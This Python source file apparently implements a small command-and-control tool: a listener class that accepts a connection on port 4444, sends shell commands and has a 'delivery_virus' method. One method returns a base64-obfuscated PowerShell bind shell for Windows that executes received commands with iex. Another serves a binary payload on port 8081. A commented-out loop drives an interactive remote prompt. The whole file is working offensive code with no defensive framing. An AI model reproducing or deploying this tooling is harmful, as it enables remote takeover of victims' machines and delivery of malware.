import socket, socketserver
import http.server
import os, time

class tunnel:
    
    def __init__(self, lhost="0.0.0.0", lport=4444):
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.sock.bind((lhost,lport))
        self.sock.listen(5)
        print("listening on port {}".format(lport))
        self.conn, self.addr = self.sock.accept()
        self.conn.settimeout(5.0)
        print("connection from: {}",self.addr)
        
    def get_conn(self):
        return self.conn
    
    def sent_command(self, command):
        self.conn.send(command)
        time.sleep(1)
        
    def get_response(self):
        return self.conn.recv(1024).decode()
    
    def delivery_virus(self, virus):
        self.conn.sendall(virus)

    def generate_base64_bind_shell_code(self, ostype:str):
        if ostype == "windows":
            bind_shell = ""
            bind_shell += "JABsAGkAcwB0AGUAbgBlAHIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBr"
            bind_shell += "AGUAdABzAC4AVABjAHAATABpAHMAdABlAG4AZQByACgAIgAwAC4AMAAuADAALgAwACIALAA3ADcANwA3ACkAOwAkAGwAaQBzAHQA"
            bind_shell += "ZQBuAGUAcgAuAHMAdABhAHIAdAAoACkAOwAkAGMAbABpAGUAbgB0ACAAPQAgACQAbABpAHMAdABlAG4AZQByAC4AQQBjAGMAZQBw"
            bind_shell += "AHQAVABjAHAAQwBsAGkAZQBuAHQAKAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIA"
            bind_shell += "ZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3"
            bind_shell += "AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIA"
            bind_shell += "eQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBq"
            bind_shell += "AGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkA"
            bind_shell += "bgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAg"
            bind_shell += "AD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4A"
            bind_shell += "ZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0"
            bind_shell += "AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0A"
            bind_shell += "OgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAu"
            bind_shell += "AFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQA"
            bind_shell += "cwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA7ACQAbABpAHMAdABl"
            bind_shell += "AG4AZQByAC4AUwB0AG8AcAAoACkA"
            return bind_shell
        elif ostype == "linux":
            return ""
        else:
            return ""
        
   
        
    def deploy_server(self, data):
        serversocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        host = "0.0.0.0"
        port = 8081
        serversocket.bind((host,port))
        serversocket.listen(5)
        print("Deployment Server listening on port", port)
        clientsocket,addr = serversocket.accept()
        print("Got a connection from", addr)
        try:
            binary_content = data.read()
            chunk_size = 1024
            for i in range(0, len(binary_content), chunk_size):
                clientsocket.sendall(binary_content[i:i+chunk_size])
        except FileNotFoundError:
            clientsocket.sendall(b'File not found')
        except Exception:
            print("error on deploy:")
        clientsocket.close()
        serversocket.close()
            

# c = tunnel()

# while True:
#     try:
#         command = input("$ ").encode()
#         if command == b"exit":
#             break
#         command+=b"\n"
#         c.sent_command(command)
#         print(c.get_response())
#     except TimeoutError as t:
#         print("no Response")
        